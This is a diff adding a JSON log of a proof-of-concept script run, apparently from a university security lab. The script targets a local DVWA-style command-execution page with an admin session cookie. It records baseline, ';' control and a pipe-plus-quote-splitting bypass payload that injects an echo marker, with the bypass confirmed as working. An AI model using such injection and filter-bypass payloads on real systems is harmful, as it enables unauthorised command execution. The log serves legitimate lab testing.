@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\CMD-003__1.py",
+    "--url",
+    "http://127.0.0.1:9080/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_high.cookie",
+    "--os",
+    "linux"
+  ],
+  "started_at": "2026-10-20T14:42:31+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 6.435,
+  "stdout": "{\r\n  \"target\": \"http://127.0.0.1:9080/vulnerabilities/exec/\",\r\n  \"os_branch\": \"linux\",\r\n  \"marker\": \"DSH_MARK_CMD003\",\r\n  \"cases\": {\r\n    \"baseline\": {\r\n      \"payload\": \"127.0.0.1\",\r\n      \"status\": 200,\r\n      \"final_url\": \"http://127.0.0.1:9080/vulnerabilities/exec/\",\r\n      \"redirect_detected\": false,\r\n      \"auth_wall_hint\": false,\r\n      \"csrf_hint\": true,\r\n      \"body_length\": 5060,\r\n      \"pre_blocks\": 1,\r\n      \"marker_total\": 0,\r\n      \"marker_inside_pre\": 0,\r\n      \"marker_outside_pre\": 0,\r\n      \"marker_standalone_line_in_pre\": false,\r\n      \"ping_evidence_lines\": 4,\r\n      \"ping_summary_lines\": [\r\n        \"4 packets transmitted, 4 received, 0% packet loss, time 3067ms\",\r\n        \"rtt min/avg/max/mdev = 0.007/0.029/0.049/0.015 ms\"\r\n      ]\r\n    },\r\n    \"blinded_control\": {\r\n      \"payload\": \"127.0.0.1;echo DSH_MARK_CMD003\",\r\n      \"status\": 200,\r\n      \"final_url\": \"http://127.0.0.1:9080/vulnerabilities/exec/\",\r\n      \"redirect_detected\": false,\r\n      \"auth_wall_hint\": false,\r\n      \"csrf_hint\": true,\r\n      \"body_length\": 4635,\r\n      \"pre_blocks\": 1,\r\n      \"marker_total\": 0,\r\n      \"marker_inside_pre\": 0,\r\n      \"marker_outside_pre\": 0,\r\n      \"marker_standalone_line_in_pre\": false,\r\n      \"ping_evidence_lines\": 0,\r\n      \"ping_summary_lines\": []\r\n    },\r\n    \"bypass\": {\r\n      \"payload\": \"127.0.0.1|echo DSH_MARK_CM'D003'\",\r\n      \"status\": 200,\r\n      \"final_url\": \"http://127.0.0.1:9080/vulnerabilities/exec/\",\r\n      \"redirect_detected\": false,\r\n      \"auth_wall_hint\": false,\r\n      \"csrf_hint\": true,\r\n      \"body_length\": 4651,\r\n      \"pre_blocks\": 1,\r\n      \"marker_total\": 1,\r\n      \"marker_inside_pre\": 1,\r\n      \"marker_outside_pre\": 0,\r\n      \"marker_standalone_line_in_pre\": true,\r\n      \"ping_evidence_lines\": 0,\r\n      \"ping_summary_lines\": []\r\n    }\r\n  },\r\n  \"observed\": true,\r\n  \"interpretation\": \"command execution observed: marker appears as a standalone line inside the command-output <pre> while baseline and ';' control stay clean\"\r\n}\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "CMD-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\CMD-003__1.py",
+  "args_redacted": [
+    "--url",
+    "http://127.0.0.1:9080/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_high.cookie",
+    "--os",
+    "linux"
+  ]
+}
